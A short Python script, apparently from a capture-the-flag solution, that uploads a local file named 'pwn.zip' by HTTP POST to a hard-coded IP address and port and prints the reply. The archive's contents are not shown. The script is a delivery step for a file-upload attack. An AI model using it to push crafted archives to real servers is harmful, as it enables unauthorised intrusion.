import requests

my_file = open("./pwn.zip", "rb")
target = "http://52.59.124.14:10015/"

test_response = requests.post(target, files = {"file" : my_file})

if test_response.ok:
    print("Upload completed successfully!")
    print(test_response.text)
else:
    print("Something went wrong!")
